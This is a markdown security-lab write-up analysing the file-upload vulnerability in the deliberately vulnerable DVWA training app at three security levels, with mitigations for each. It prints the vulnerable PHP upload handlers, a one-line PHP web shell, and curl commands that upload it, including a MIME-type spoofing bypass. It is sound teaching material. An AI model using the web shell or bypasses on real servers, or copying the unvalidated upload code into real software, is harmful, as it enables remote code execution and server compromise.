
# 🛠️ DVWA – File Upload Vulnerability Analysis (Low / Medium / High Security)

---

## 🔢 Input Code – LOW Security Level

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        $html .= '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?>
```

---

## 🛡️ File Upload – LOW Security

### 📌 Overview
The code allows users to upload any file without restriction. It does not validate the file type, extension, size, or contents. An attacker could upload a malicious PHP script and execute it from the `/uploads` directory to gain remote code execution (RCE).

---

### 🔍 Vulnerabilities Identified

```markdown
🔒 Vulnerability | ❌ Problem Description  
---|---  
Unrestricted File Upload | No file type or extension validation  
Executable Code Upload | PHP files can be uploaded and executed  
No Size Restriction | No control over file size (DoS risk)  
No Path Sanitization | Potential for directory traversal or overwriting  
```

---

### 2️⃣ Exploitation Phase: Manual or Automated

```markdown
🔨 Tool Used: Burp Suite, curl, browser upload  
🔧 Setup: Use the form to upload a file named `shell.php` with a payload like `<?php system($_GET['cmd']); ?>`  
🔁 Payload: `curl -F "uploaded=@shell.php" http://dvwa.local/vulnerabilities/upload/`  
🎯 Success Indicator: File appears in `/hackable/uploads/` and can be accessed directly  
📸 Screenshot: 📸 shell.php uploaded successfully
```

---

### 4️⃣ Risk & Real-World Impact

```markdown
🧠 Exploit Impact | 🎯 Description  
---|---  
Remote Code Execution | Uploading `.php` files allows server-side command execution  
Web Shell Access | Attackers can maintain persistent access to the server  
Pivot to Internal Network | May be used to exploit internal services  
```

---

### 5️⃣ 🚧 Mitigation Measures (Secure Coding)

```markdown
🚫 Vulnerability | ✅ Mitigation  
---|---  
No file validation | Restrict to specific MIME types and file extensions  
Execution of uploaded code | Store files outside web root or rename on upload  
No size validation | Limit maximum upload size via both frontend and backend  
Missing sanitization | Sanitize filenames and use random hashes as names  
```

---

## 🔢 Input Code – MEDIUM Security Level

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // File information
    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];

    // Is it an image?
    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        ( $uploaded_size < 100000 ) ) {

        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
            $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        $html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

---

## 🛡️ File Upload – MEDIUM Security

### 📌 Overview
The code adds MIME type and size validation, improving security. However, MIME type checks rely on the client-supplied `$_FILES['type']`, which can be spoofed. There is still no file extension validation or content-based verification.

---

### 🔍 Vulnerabilities Identified

```markdown
🔒 Vulnerability | ❌ Problem Description  
---|---  
Spoofable MIME Type | Relies on `$_FILES['type']`, which can be faked  
No Extension Check | Allows dangerous extensions like `.php` if spoofed  
Client-Side Trust | Assumes uploaded data is honest  
Upload Directory Executable | Files are still stored inside web-accessible directory  
```

---

### 2️⃣ Exploitation Phase: Manual or Automated

```markdown
🔨 Tool Used: Burp Suite, curl with custom headers  
🔧 Setup: Upload `shell.php` and set `Content-Type: image/jpeg`  
🔁 Payload: Use curl: `curl -F "uploaded=@shell.php;type=image/jpeg" http://dvwa.local/vulnerabilities/upload/`  
🎯 Success Indicator: File appears in `/uploads/` and is executable  
📸 Screenshot: 📸 shell.php accepted as image/jpeg
```

---

### 4️⃣ Risk & Real-World Impact

```markdown
🧠 Exploit Impact | 🎯 Description  
---|---  
Server Compromise | RCE by spoofing file type  
Evade Detection | Attacker bypasses weak MIME validation  
Persistence | Upload webshells disguised as images  
```

---

### 5️⃣ 🚧 Mitigation Measures (Secure Coding)

```markdown
🚫 Vulnerability | ✅ Mitigation  
---|---  
Trusting MIME type | Use `finfo_file()` to detect file content  
No extension control | Whitelist extensions and reject `.php`, `.exe`, etc.  
No renaming | Rename uploads to safe random names  
Executable path | Store uploads outside the public web directory  
```

---

## 🔢 Input Code – HIGH Security Level

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];

    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
        ( $uploaded_size < 100000 ) &&
        getimagesize( $uploaded_tmp ) ) {

        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
            $html .= '<pre>Your image was not uploaded.</pre>';
        }
        else {
            $html .= "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        $html .= '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
    }
}

?>
```

---

## 🛡️ File Upload – HIGH Security

### 📌 Overview
This version uses multiple security checks: file extension, content validation via `getimagesize()`, and file size. These mitigations make it significantly harder to bypass. However, files are still stored in a public directory and filename sanitization is weak.

---

### 🔍 Vulnerabilities Identified

```markdown
🔒 Vulnerability | ❌ Problem Description  
---|---  
Filename Injection | `basename()` used but no sanitization (e.g., `evil.php.jpg`)  
Executable Upload Directory | Files still stored in a web-accessible directory  
No Randomized Names | File collisions or overwrite risks  
```

---

### 2️⃣ Exploitation Phase: Manual or Automated

```markdown
🔨 Tool Used: Manual Upload, Burp  
🔧 Setup: Attempt to upload `shell.php.jpg` with embedded PHP  
🔁 Payload: Upload double extension file  
🎯 Success Indicator: Should fail (good), but still test for edge cases  
📸 Screenshot: 📸 attempted file rejected
```

---

### 4️⃣ Risk & Real-World Impact

```markdown
🧠 Exploit Impact | 🎯 Description  
---|---  
Filename Abuse | Attacker may try to bypass with `php.jpg` if Apache misconfigured  
Race Conditions | Lack of filename randomization enables overwrite attacks  
Residual Attack Surface | Public path still exposes files to attacker enumeration  
```

---

### 5️⃣ 🚧 Mitigation Measures (Secure Coding)

```markdown
🚫 Vulnerability | ✅ Mitigation  
---|---  
Static Filenames | Generate UUID or hash-based names  
Public upload directory | Store outside document root or use `.htaccess` to prevent execution  
Loose extension filtering | Enforce strict MIME + extension + content verification  
Filename reuse | Prevent duplicate file overwrites with uniqueness check  
```

---
